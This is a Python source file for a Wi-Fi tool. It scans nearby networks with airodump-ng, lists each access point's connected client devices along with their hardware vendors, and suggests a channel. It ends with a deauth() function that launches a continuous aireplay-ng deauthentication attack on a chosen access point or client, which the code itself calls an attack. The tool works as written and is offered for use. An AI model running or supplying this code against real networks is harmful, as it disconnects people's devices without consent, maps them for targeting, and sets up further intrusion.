import sys
import argparse
import asyncio
import pywifi
from pywifi import const
from bleak import BleakScanner
import subprocess
import json
import time
import select
import requests
import re
import csv
from datetime import datetime
import warnings
warnings.simplefilter(action='ignore', category=FutureWarning)

from color import *

def get_mac_vendor(mac_address):
    url = f"https://api.macvendors.com/{mac_address}"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code == 200:
            return f"{Color.GREEN}{Style.BRIGHT}{response.text.strip()}{Style.RESET_ALL}"
        else:
            return f"{Color.RED}{Style.BRIGHT}Unknown{Style.RESET_ALL}"
    except requests.RequestException:
        return f"{Color.RED}{Style.BRIGHT}Unknown{Style.RESET_ALL}"

def scan_wifi(timeout, filter_ssid=None, filter_channel=None, min_signal=None, analyze_channels=False):
    print(f"\n{Color.GREEN}{Style.BRIGHT}[*]{Style.RESET_ALL} Scanning Wi-Fi networks for {timeout}s...")

    csv_file = "/tmp/airodump-01.csv"

    process = subprocess.Popen(
        ["sudo", "airodump-ng", "wlan0mon", "--write", "/tmp/airodump", "--output-format", "csv"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    time.sleep(timeout)
    process.terminate()
    process.wait()

    try:
        with open(csv_file, "r", encoding="ISO-8859-1") as file:
            reader = csv.reader(file)
            rows = list(reader)
    except FileNotFoundError:
        print(f"{Color.RED}{Style.BRIGHT}[!]{Style.RESET_ALL} No networks detected. Make sure your Wi-Fi adapter is in monitor mode.")
        return

    ap_list = []
    client_list = []
    parsing_clients = False

    for row in rows:
        if len(row) < 2:
            continue
        if "Station MAC" in row[0]:  
            parsing_clients = True
            continue

        if not parsing_clients:
            if len(row) > 13: 
                try:
                    bssid = row[0].strip()
                    signal = int(row[8].strip()) if row[8].strip().lstrip('-').isdigit() else -100  
                    channel = int(row[3].strip()) if row[3].strip().isdigit() else -1
                    security = row[5].strip() 
                    cipher = row[6].strip() if row[6].strip() else "Unknown"  
                    auth = row[7].strip() if row[7].strip() else "Unknown"  
                    essid = row[13].strip()

                    ap_list.append({"BSSID": bssid, "Signal": signal, "Channel": channel, "Security": f"{security} {cipher} {auth}", "ESSID": essid})
                except ValueError:
                    continue
        else:
            if len(row) > 6:
                try:
                    station_mac = row[0].strip()
                    associated_bssid = row[5].strip()
                    signal = int(row[3].strip()) if row[3].strip().lstrip('-').isdigit() else -100  

                    client_list.append({"Station": station_mac, "BSSID": associated_bssid, "Signal": signal})
                except ValueError:
                    continue
    

    if filter_ssid:
        ap_list = [net for net in ap_list if net["ESSID"] == filter_ssid]
    if filter_channel:
        channels = list(map(int, filter_channel.split('-')))
        ap_list = [net for net in ap_list if net["Channel"] in channels]
    if min_signal:
        ap_list = [net for net in ap_list if net["Signal"] >= min_signal]
    
    ap_list.sort(key=lambda x: x["Signal"], reverse=True)
    
    print("\n=== DETECTED WI-FI NETWORKS ===")
    for ap in ap_list:
        if ap['ESSID']:
          print(f"\nSSID: {Color.GREEN}{Style.BRIGHT}{ap['ESSID']}{Style.RESET_ALL} | BSSID: {ap['BSSID']} -> {get_mac_vendor(ap['BSSID'])} | Signal: {ap['Signal']} dBm | Security: {ap['Security']} | Channel: {ap['Channel']}")
          
          associated_clients = [c for c in client_list if c["BSSID"] == ap["BSSID"]]
          if associated_clients:
              print("   +- CONNECTED DEVICES")
              for client in associated_clients:
                  print(f"   Device: {client['Station']} -> {get_mac_vendor(client['Station'])} | Signal: {client['Signal']} dBm")
    
    if analyze_channels:
        analyze_wifi_channels(ap_list)
    
    subprocess.run("sudo rm /tmp/airodump-01.csv", shell=True)

def analyze_wifi_channels(networks):

    channel_usage = {}
    
    for net in networks:
        channel = net["Channel"]
        channel_usage[channel] = channel_usage.get(channel, 0) + 1
    
    best_channel = min(channel_usage, key=channel_usage.get, default=None)
    if best_channel:
        print(f"\n{Color.GREEN}{Style.BRIGHT}[*]{Style.RESET_ALL} Recommended Wi-Fi Channel: {Color.MAGENTA}{Style.BRIGHT}{best_channel}{Style.RESET_ALL} (Least interference detected)\n")

def deauth(bssid, station, timeout):
    """
    Sends deauthentication packets to a specific client or in broadcast mode.

    :param bssid: MAC address of the target access point.
    :param station: MAC address of the target client (optional, otherwise broadcast).
    :param timeout: Duration of the attack in seconds.
    """
    print(f"\n{Color.GREEN}{Style.BRIGHT}[*]{Style.RESET_ALL} Sending deauthentication packets to {bssid} for {timeout}s...")

    # Check if the interface is in monitor mode
    result = subprocess.run(["iwconfig", "wlan0mon"], capture_output=True, text=True)
    if "Mode:Monitor" not in result.stdout:
        print(f"{Color.RED}{Style.BRIGHT}[!]{Style.RESET_ALL} wlan0mon is not in monitor mode.")
        print(f"{Color.YELLOW}[*] Enable monitor mode with: sudo airmon-ng start wlan0{Style.RESET_ALL}")
        return

    # Construct the aireplay-ng command
    cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "wlan0mon"]
    if station:
        cmd.extend(["-c", station])  # Add target station if specified

    # Start the attack
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        time.sleep(timeout)
    except KeyboardInterrupt:
        print(f"\n{Color.RED}{Style.BRIGHT}[!]{Style.RESET_ALL} Interrupt detected, stopping attack...")
    finally:
        process.terminate()
        process.wait()
        print(f"\n{Color.GREEN}{Style.BRIGHT}[*]{Style.RESET_ALL} Deauthentication attack completed.")